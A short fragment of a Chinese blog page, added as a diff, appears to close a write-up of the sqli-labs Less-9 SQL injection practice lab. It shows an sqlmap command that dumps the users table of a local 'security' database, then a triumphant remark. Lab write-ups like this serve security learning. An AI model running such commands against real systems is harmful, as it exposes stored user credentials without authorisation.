+<p><code>sqlmap -u &quot;http://localhost/Less-9/?id=1&quot; --batch -D &quot;security&quot; -T &quot;users&quot; --dump</code></p>
+<p>普通小连招直接拿下。</p>
+<p><img src="/images/QQ20251230-204650.png" alt="alt text"></p>
+<p>Over！！！！！！</p>
+<hr>
+<h2 id="9：-1"><a href="#9：-1" class="headerlink" title="#9："></a>#9：</h2><hr>
+<p>版权声明：本文由白白毛毛创作，转载请注明出处。</p>
+
+        </div>
+    </article>
+</div>
+
+</div>
+
+<script src="/js/main.js?v=1767337365559"></script>
+</body>
+</html>
